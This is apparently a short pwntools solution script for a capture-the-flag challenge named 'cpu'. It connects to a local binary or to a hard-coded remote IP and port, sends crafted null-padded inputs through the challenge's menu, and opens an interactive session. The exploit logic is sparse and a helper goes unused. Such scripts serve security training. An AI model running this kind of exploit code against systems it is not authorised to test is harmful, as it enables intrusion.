# python2 sol_cpu.py

from pwn import *
import time
import disassembler as d

#context.log_level = 'debug'
debug = True

sample_flag = 'bob{s@mplflag}'

def run_encryption(msg):
    s.sendlineafter('> ', '1')
    s.sendafter(': ', msg)

def run_own(program, argv):
    s.sendlineafter('> ', '2')
    s.sendlineafter('(in hex) : ', program)
    s.sendlineafter('(max: 3)', str(len(argv)))
    for arg in argv:
        s.sendafter(': ', arg)

def exploit():
    run_encryption('1' + '\x00' * (len(sample_flag) - 1))
    run_encryption('1' + '\x00' * (len(sample_flag) - 1))
    s.sendlineafter('> ', '3')

if __name__ == '__main__':
    if debug:
        s = process('./cpu')
        pause()
    else:
        s = remote('3.36.92.16', 9929)
    exploit()
    s.interactive()
    s.close()
